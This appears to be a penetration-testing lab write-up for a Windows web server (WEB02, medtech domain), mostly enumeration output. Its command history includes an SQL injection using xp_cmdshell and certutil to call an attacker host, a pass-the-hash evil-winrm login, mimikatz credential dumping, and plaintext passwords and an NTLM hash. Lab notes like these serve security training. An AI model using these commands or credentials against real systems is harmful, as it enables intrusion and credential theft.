# VM 3 192.168.x.121
# Summary
- 
# Flag Location
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`
- C:\Users\Administrator\Desktop\proof.txt
# Accounts
### Administrator
`evil-winrm -i 192.168.213.121 -u Administrator -H b2c03054c306ac8fc5f9d188710b0168`
```

```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.159.121 --top-ports 1000`
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Local Users
`Get-LocalUser`
```
Name               Enabled Description
----               ------- -----------
Administrator      True    Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
offsec             True    offsec
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scenarios.

C:/Users
d-----         10/4/2022  12:21 AM                .NET v4.5
d-----         10/4/2022  12:21 AM                .NET v4.5 Classic
d-----         7/23/2024  10:44 PM                Administrator
d-----        10/13/2022  11:47 PM                administrator.MEDTECH
d-----        10/13/2022  11:44 PM                joe
d-----         9/29/2022   4:29 AM                offsec
d-r---         9/29/2022   1:57 AM                Public

```
## Local Groups
`Get-LocalGroup`
```
SQLServer2005SQLBrowserUser$WEB02   Members in the group have the required access and privileges to be assigned as the log on account for the associated instance of SQL Server Browser.
Access Control Assistance Operators Members of this group can remotely query authorization attributes and permissions for resources on this computer.
Administrators                      Administrators have complete and unrestricted access to the computer/domain
Backup Operators                    Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authorities in the enterprise
Cryptographic Operators             Members are authorized to perform cryptographic operations.
Device Owners                       Members of this group can change system-wide settings.
Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this machine.
Event Log Readers                   Members of this group can read event logs from local machine
Guests                              Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of Hyper-V.
IIS_IUSRS                           Built-in group used by Internet Information Services.
Network Configuration Operators     Members in this group can have some administrative privileges to manage configuration of networking features
Performance Log Users               Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
Performance Monitor Users           Members of this group can access performance counter data locally and remotely
Power Users                         Power Users are included for backwards compatibility and possess limited administrative powers
Print Operators                     Members can administer printers installed on domain controllers
RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Sessio...
RDS Management Servers              Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers ...
RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This gr...
Remote Desktop Users                Members in this group are granted the right to logon remotely
Remote Management Users             Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
Replicator                          Supports file replication in a domain
Storage Replica Administrators      Members of this group have complete and unrestricted access to all features of Storage Replica.
System Managed Accounts Group       Members of this group are managed by the system.
Users                               Users are prevented from making accidental or intentional system-wide changes and can run most applications

```
## System Info
`systeminfo`
```
Host Name:                 WEB02
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-10000-00001-AA820
Original Install Date:     9/29/2022, 12:56:59 AM
System Boot Time:          7/23/2024, 9:41:33 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,140 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,810 MB
Virtual Memory: In Use:    1,989 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    medtech.com
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB5017265
                           [02]: KB5012170
                           [03]: KB5017316
                           [04]: KB5016704
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.213.121
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.213.254
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```
## Routes
`route print`
```
===========================================================================
Interface List
  2...00 50 56 86 b6 ea ......vmxnet3 Ethernet Adapter
  5...00 50 56 86 13 94 ......vmxnet3 Ethernet Adapter #2
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.213.254  192.168.213.121     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     172.16.213.0    255.255.255.0         On-link    172.16.213.254    271
   172.16.213.254  255.255.255.255         On-link    172.16.213.254    271
   172.16.213.255  255.255.255.255         On-link    172.16.213.254    271
    192.168.213.0    255.255.255.0         On-link   192.168.213.121    271
  192.168.213.121  255.255.255.255         On-link   192.168.213.121    271
  192.168.213.255  255.255.255.255         On-link   192.168.213.121    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.213.121    271
        224.0.0.0        240.0.0.0         On-link    172.16.213.254    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.213.121    271
  255.255.255.255  255.255.255.255         On-link    172.16.213.254    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.213.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

```
## Netstat
`netstat -ano`
```
  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       940
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       732
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       592
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1284
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       732
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1812
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2244
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       1684
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       712
  TCP    172.16.213.254:139     0.0.0.0:0              LISTENING       4
  TCP    172.16.213.254:59774   0.0.0.0:0              LISTENING       6924
  TCP    192.168.213.121:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.213.121:5985   192.168.45.219:36246   TIME_WAIT       0
  TCP    192.168.213.121:5985   192.168.45.219:55528   TIME_WAIT       0
  TCP    192.168.213.121:5985   192.168.45.219:55538   ESTABLISHED     4
  TCP    192.168.213.121:5985   192.168.45.219:59050   TIME_WAIT       0
  TCP    192.168.213.121:5985   192.168.45.219:60402   TIME_WAIT       0
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       940
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       732
  TCP    [::]:49665             [::]:0                 LISTENING       592
  TCP    [::]:49666             [::]:0                 LISTENING       1284
  TCP    [::]:49667             [::]:0                 LISTENING       732
  TCP    [::]:49668             [::]:0                 LISTENING       1812
  TCP    [::]:49669             [::]:0                 LISTENING       2244
  TCP    [::]:49670             [::]:0                 LISTENING       1684
  TCP    [::]:49671             [::]:0                 LISTENING       712
  UDP    0.0.0.0:123            *:*                                    1044
  UDP    0.0.0.0:162            *:*                                    5080
  UDP    0.0.0.0:500            *:*                                    1668
  UDP    0.0.0.0:4500           *:*                                    1668
  UDP    0.0.0.0:5353           *:*                                    1180
  UDP    0.0.0.0:5355           *:*                                    1180
  UDP    0.0.0.0:65041          *:*                                    1180
  UDP    127.0.0.1:1900         *:*                                    5064
  UDP    127.0.0.1:51120        127.0.0.1:51120                        1956
  UDP    127.0.0.1:51489        127.0.0.1:51489                        732
  UDP    127.0.0.1:56941        127.0.0.1:56941                        3156
  UDP    127.0.0.1:57370        *:*                                    5064
  UDP    127.0.0.1:57371        127.0.0.1:57371                        1448
  UDP    127.0.0.1:60107        127.0.0.1:60107                        1488
  UDP    172.16.213.254:137     *:*                                    4
  UDP    172.16.213.254:138     *:*                                    4
  UDP    172.16.213.254:1900    *:*                                    5064
  UDP    172.16.213.254:57369   *:*                                    5064
  UDP    192.168.213.121:137    *:*                                    4
  UDP    192.168.213.121:138    *:*                                    4
  UDP    192.168.213.121:1900   *:*                                    5064
  UDP    192.168.213.121:57368  *:*                                    5064
  UDP    [::]:123               *:*                                    1044
  UDP    [::]:162               *:*                                    5080
  UDP    [::]:500               *:*                                    1668
  UDP    [::]:4500              *:*                                    1668
  UDP    [::]:65041             *:*                                    1180
  UDP    [::1]:1900             *:*                                    5064
  UDP    [::1]:57367            *:*                                    5064

```
## Environment Vars
`Get-ChildItem Env:`
```
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\Administrator\AppData\Roaming
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   WEB02
ComSpec                        C:\Windows\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
LOCALAPPDATA                   C:\Users\Administrator\AppData\Local
NUMBER_OF_PROCESSORS           2
OS                             Windows_NT
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files...
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
PROCESSOR_LEVEL                23
PROCESSOR_REVISION             0102
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PSModulePath                   C:\Users\Administrator\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShe...
PUBLIC                         C:\Users\Public
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\ADMINI~1\AppData\Local\Temp
TMP                            C:\Users\ADMINI~1\AppData\Local\Temp
USERDOMAIN                     WEB02
USERNAME                       Administrator
USERPROFILE                    C:\Users\Administrator
windir                         C:\Windows

```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```
           DC: \\DC01
      Address: \\172.16.213.10
     Dom Guid: 29ae137a-f795-4fd5-a839-607b5807b1d7
     Dom Name: MEDTECH
  Forest Name: medtech.com
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 KEYLIST
The command completed successfully

```
## API Endpoints
`gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern`
```
/assets               (Status: 301) [Size: 156] [--> http://192.168.159.121:80/assets/]
/css                  (Status: 301) [Size: 153] [--> http://192.168.159.121:80/css/]
/fonts                (Status: 301) [Size: 155] [--> http://192.168.159.121:80/fonts/]
/js                   (Status: 301) [Size: 152] [--> http://192.168.159.121:80/js/]
/master               (Status: 301) [Size: 156] [--> http://192.168.159.121:80/master/]

```
# Services    


## Command History
```c
    gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern
    gobuster dir -u 192.168.159.121 -w /usr/share/wordlists/dirb/common.txt -t 5
    // Attempt sql injection on website
    ...
    //using burp username field
    admin'; EXEC xp_cmdshell "certutil -urlcache -split -f http://<attack host IP addr>:8000/works"; -- -
    '

    // found on discord...
    evil-winrm -i 192.168.213.121 -u Administrator -H b2c03054c306ac8fc5f9d188710b0168
    Get-Command Invoke-Sqlcmd
    Invoke-Sqlcmd -ServerInstance "localhost" -Query "SELECT name FROM sys.sql_logins;"
    //web.config -> C:\inetpub\wwwroot> cat web.config
    /* <connectionStrings>
                <add name="myConnectionString" connectionString="server=localhost\SQLEXPRESS;database=webapp;uid=sa;password=WhileChirpTuesday218;Trusted_Connection=False;MultipleActiveResultSets=true; Integrated Security=False; Max Pool Size=500;" />
        </connectionStrings>*/
    // get mssql paths -> MSSQL15.SQLEXPRESS             (default) : SQLEXPRESS
    Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\"             "
    // sqlcmd get all the databases
    sqlcmd -S localhost\SQLEXPRESS -Q "SELECT name FROM master..sysdatabases"
    // -d for the database
    sqlcmd -S localhost\SQLEXPRESS -d webapp -Q "SELECT * FROM users;"
    // appears to be empty...

    // upload mimikatz
    .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
    //found joe / Flowers1
```
